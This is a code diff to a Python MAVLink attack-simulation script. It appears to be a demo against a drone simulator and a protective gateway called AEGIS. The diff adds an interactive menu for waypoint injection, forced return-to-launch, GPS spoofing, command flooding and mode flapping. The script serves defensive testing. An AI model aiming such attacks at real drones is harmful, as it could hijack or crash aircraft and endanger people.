@@ -4,6 +4,9 @@ MAVLink Attacker - Simulated Malicious Actor
 
 ⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️
 
+DEPLOYMENT: Run on Laptop 2 (separate from GCS/SITL)
+TRUST LEVEL: ❌ Untrusted (hostile actor)
+
 This script simulates various attack vectors against a UAV system:
 1. GPS Spoofing - Fake GPS coordinates to mislead navigation
 2. Waypoint Injection - Inject unauthorized mission waypoints
@@ -12,6 +15,9 @@ This script simulates various attack vectors against a UAV system:
 
 Usage:
     Run this on a SEPARATE LAPTOP from the GCS/SITL system
+    
+    # Interactive mode (recommended for demo)
+    python attacker.py --interactive
     
     WITHOUT AEGIS (attacks succeed):
         python attacker.py --target <SITL_IP> --port 14550
@@ -28,7 +34,9 @@ import sys
 import argparse
 import logging
 import os
+import yaml
 from typing import Optional
+from pathlib import Path
 import socket
 
 # Import pymavlink
@@ -362,6 +370,121 @@ class MAVLinkAttacker:
         logger.info(f"DoS Flooding:       {self.attacks_sent['dos_flood']}")
         logger.info(f"Total Attacks:      {self.attacks_sent['total']}")
         logger.info("=" * 70)
+    
+    def interactive_mode(self):
+        """Interactive attacker console"""
+        print("\n" + "="*70)
+        print("   ATTACKER CONSOLE")
+        print("   MAVLink Injection Interface")
+        print("="*70)
+        print(f"Target: AEGIS Gateway {self.target_host}:{self.target_port}")
+        print("="*70)
+        print("\n⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️\n")
+        
+        while True:
+            print("\nSelect an attack to launch:")
+            print()
+            print("[1] Inject Fake Waypoint")
+            print("[2] Force Return-to-Launch (RTL)")
+            print("[3] GPS Spoofing Attack")
+            print("[4] Command Flood (DoS-style)")
+            print("[5] Mode Flapping Attack")
+            print("[0] Exit Attacker Console")
+            print()
+            
+            try:
+                choice = input("Enter choice: ").strip()
+                
+                if choice == '0':
+                    print("\n🛑 Exiting attacker console...")
+                    break
+                
+                elif choice == '1':
+                    # Waypoint injection
+                    print("\n🚨 Launching waypoint injection attack...")
+                    try:
+                        lat = input("Enter latitude (default 37.7749): ").strip()
+                        lon = input("Enter longitude (default -122.4194): ").strip()
+                        alt = input("Enter altitude (default 1000): ").strip()
+                        
+                        latitude = float(lat) if lat else 37.7749
+                        longitude = float(lon) if lon else -122.4194
+                        altitude = float(alt) if alt else 1000
+                        
+                        self.attack_waypoint_injection(99, latitude, longitude, altitude)
+                    except ValueError:
+                        logger.error("Invalid coordinate values")
+                
+                elif choice == '2':
+                    # RTL injection
+                    print("\n🚨 Forcing Return-to-Launch...")
+                    self.attack_command_injection('RTL')
+                
+                elif choice == '3':
+                    # GPS spoofing
+                    print("\n🚨 Launching GPS spoofing attack...")
+                    try:
+                        duration = input("Enter duration in seconds (default 5): ").strip()
+                        dur = int(duration) if duration else 5
+                        self.attack_gps_spoofing(37.7749, -122.4194, 1000, duration=dur)
+                    except ValueError:
+                        logger.error("Invalid duration value")
+                
+                elif choice == '4':
+                    # DoS flooding
+                    print("\n🚨 Launching DoS flooding attack...")
+                    try:
+                        duration = input("Enter duration in seconds (default 5): ").strip()
+                        rate = input("Enter message rate (default 100): ").strip()
+                        
+                        dur = int(duration) if duration else 5
+                        msg_rate = int(rate) if rate else 100
+                        
+                        self.attack_dos_flooding(dur, msg_rate)
+                    except ValueError:
+                        logger.error("Invalid parameter values")
+                
+                elif choice == '5':
+                    # Mode flapping
+                    print("\n🚨 Launching mode flapping attack...")
+                    logger.info("Rapidly switching between GUIDED and LOITER modes...")
+                    for i in range(10):
+                        mode = "GUIDED" if i % 2 == 0 else "LOITER"
+                        self.attack_command_injection(f'MODE_{mode}')
+                        time.sleep(0.5)
+                    logger.info("Mode flapping complete")
+                
+                else:
+                    print("❌ Invalid choice. Please try again.")
+                
+                time.sleep(1)
+                
+            except KeyboardInterrupt:
+                print("\n\n🛑 Attacker interrupted by user")
+                break
+            except Exception as e:
+                logger.error(f"Attack error: {e}")
+        
+        self.print_statistics()
+
+
+def load_config(config_path: str = "config.yaml") -> dict:
+    """Load configuration from YAML file"""
+    config_file = Path(__file__).parent / config_path
+    
+    if not config_file.exists():
+        logger.warning(f"Config file not found: {config_file}")
+        logger.info("Using command line arguments")
+        return {}
+    
+    try:
+        with open(config_file, 'r') as f:
+            config = yaml.safe_load(f)
+            logger.info(f"✅ Configuration loaded from {config_file}")
+            return config
+    except Exception as e:
+        logger.error(f"Failed to load config: {e}")
+        return {}
 
 
 def main():
@@ -373,6 +496,9 @@ def main():
 ⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️
 
 Examples:
+  # Interactive mode (recommended for demo)
+  python attacker.py --interactive
+  
   # Attack SITL directly (no protection)
   python attacker.py --target 192.168.1.100 --port 14550 --attack gps-spoof
   
@@ -397,10 +523,14 @@ Attack Types:
         """
     )
     
-    parser.add_argument('--target', required=True,
+    parser.add_argument('--config', default='config.yaml',
+                       help='Path to config file (default: config.yaml)')
+    parser.add_argument('--target',
                        help='Target IP address (SITL or AEGIS proxy)')
-    parser.add_argument('--port', type=int, default=14560,
+    parser.add_argument('--port', type=int,
                        help='Target port (14550=SITL, 14560=AEGIS)')
+    parser.add_argument('--interactive', action='store_true',
+                       help='Interactive attack menu')
     parser.add_argument('--attack', default='combined',
                        choices=['gps-spoof', 'waypoint-inject', 'rtl', 'disarm', 
                                'land', 'mode-change', 'dos', 'combined'],
@@ -418,23 +548,38 @@ Attack Types:
     
     args = parser.parse_args()
     
+    # Load configuration
+    config = load_config(args.config)
+    conn_config = config.get('connection', {})
+    
+    # Get target from CLI or config
+    target_host = args.target or conn_config.get('target_host', '127.0.0.1')
+    target_port = args.port or conn_config.get('target_port', 14560)
+    
     # Create attacker instance
-    attacker = MAVLinkAttacker(args.target, args.port)
+    attacker = MAVLinkAttacker(target_host, target_port)
     
     logger.info("=" * 70)
-    logger.info("⚠️  MAVLink Attack Simulation Starting")
+    logger.info("⚠️  MAVLink Attack Simulation")
     logger.info("=" * 70)
-    logger.info(f"Target: {args.target}:{args.port}")
-    logger.info(f"Attack: {args.attack}")
+    logger.info(f"Target: {target_host}:{target_port}")
     
-    if args.port == 14550:
+    if target_port == 14550:
         logger.warning("⚠️  Attacking SITL DIRECTLY (no AEGIS protection)")
         logger.warning("⚠️  Attacks will likely SUCCEED!")
-    elif args.port == 14560:
+    elif target_port == 14560:
         logger.info("✅ Attacking through AEGIS proxy")
         logger.info("✅ Attacks should be BLOCKED")
     
     logger.info("=" * 70)
+    
+    # Handle interactive mode
+    if args.interactive:
+        time.sleep(2)
+        attacker.interactive_mode()
+        sys.exit(0)
+    
+    logger.info(f"Attack mode: {args.attack}")
     
     try:
         # Wait a moment for connection
